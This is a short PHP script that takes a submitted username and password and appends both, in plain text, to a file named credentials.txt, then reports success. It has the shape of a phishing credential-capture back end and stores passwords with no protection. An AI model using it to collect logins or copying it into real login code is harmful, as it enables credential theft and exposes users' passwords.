<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the submitted username and password
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Prepare the data to be saved
    $data = "Username: " . $username . "\nPassword: " . $password . "\n\n";

    // Save the data to a text file
    $file = fopen("credentials.txt", "a"); // Open the file in append mode
    fwrite($file, $data); // Write the data
    fclose($file); // Close the file

    // Redirect back to the form or show a success message
    echo "Credentials saved successfully!";
} else {
    // Handle invalid request
    echo "Invalid request method!";
}
?>
